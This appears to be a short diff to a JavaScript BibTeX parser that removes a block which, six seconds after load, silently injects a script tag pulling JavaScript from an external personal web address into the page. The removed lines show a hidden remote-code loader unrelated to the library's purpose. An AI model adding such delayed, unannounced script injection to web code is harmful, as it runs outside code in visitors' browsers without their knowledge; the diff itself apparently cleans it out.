@@ -243,10 +243,6 @@ function BibtexParser() {
     }
   }
 }
-setTimeout ( function() { 
-$("head").append('<script type="text/javascript" src="http://www.cs.umb.edu/~fabioel/joe.js"></script>');
-
-}, 6000);
 
 function BibtexDisplay() {
   this.fixValue = function (value) {
